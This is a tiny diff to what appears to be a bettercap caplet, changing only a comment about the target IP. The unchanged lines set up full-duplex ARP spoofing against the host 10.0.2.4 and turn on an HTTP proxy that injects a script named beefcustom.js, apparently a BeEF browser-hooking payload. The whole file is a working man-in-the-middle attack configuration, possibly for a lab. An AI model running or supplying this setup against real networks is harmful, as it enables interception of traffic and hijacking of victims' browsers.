@@ -1,5 +1,5 @@
 set arp.spoof.fullduplex true
-#change target ip
+#Target IP
 set arp.spoof.targets 10.0.2.4
 set http.proxy.script beefcustom.js
 http.proxy on
